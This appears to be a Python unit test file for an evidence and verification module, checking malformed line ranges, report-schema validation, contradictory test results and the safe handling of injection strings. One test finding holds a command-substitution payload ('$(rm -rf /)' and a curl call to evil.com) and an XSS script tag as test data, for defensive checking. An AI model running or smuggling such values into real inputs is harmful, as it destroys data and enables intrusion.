"""Malformed evidence, schema violation, and injection attack tests."""

from pathlib import Path
import tempfile
import unittest

from ship.lifecycle.evidence import (
    is_test_evidence_passing,
    validate_judge_report_contract,
)
from ship.lifecycle.verification import parse_line_range, verify_finding_grounding


class TestMalformedEvidence(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.repo_root = Path(self.temp_dir.name).resolve()

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_parse_line_range_malformed_inputs(self):
        """Invalid line ranges return empty ranges without crashing."""
        malformed = [
            "",
            "invalid",
            "L",
            "L-5",
            "L50-L20",  # inverted range
            "L0-L0",
            "Labc-Ldef",
            None,
        ]
        for item in malformed:
            with self.assertRaises(ValueError):
                parse_line_range(item)

    def test_review_report_contract_rejects_missing_required_fields(self):
        """Review report contract validator rejects missing fields."""
        incomplete_reports = [
            {},  # Empty
            {"findings": "not_a_list"},  # Invalid findings type
            {"findings": [{"title": "Only title"}]},  # Missing 11 of 12 fields
            {"findings": [{"id": "F-01", "title": "Test", "severity": "INVALID_SEVERITY"}]},
        ]
        for rep in incomplete_reports:
            errs = validate_judge_report_contract(rep)
            self.assertTrue(len(errs) > 0)

    def test_contradictory_test_evidence_rejected(self):
        """Test evidence claiming pass while exit code is non-zero or failure count > 0 is marked failing."""
        contradictory = [
            {"passed": True, "exit_code": 1},
            {"passed": True, "failed": 3},
            {"passed": True, "failures": 1},
            {"passed": True, "errors": 2},
            {"exit_code": -9},  # Killed by SIGKILL
        ]
        for ev in contradictory:
            self.assertFalse(is_test_evidence_passing(ev))

    def test_injection_strings_in_evidence_handled_safely(self):
        """Review findings containing command injections or XSS strings do not execute or break parsing."""
        injection_finding = {
            "finding_id": "FIND-INJECT-01",
            "title": "Injection test $(rm -rf /) `curl evil.com`",
            "file": "src/nonexistent.py",
            "line_range": "L1-L10",
            "severity": "HIGH",
            "code_snippet": "<script>alert('pwned')</script>",
        }
        # Grounding against nonexistent file must cleanly return False without executing anything
        is_grounded, reason = verify_finding_grounding(injection_finding, self.repo_root)
        self.assertFalse(is_grounded)
        self.assertIn("does not exist", reason)


if __name__ == "__main__":
    unittest.main()
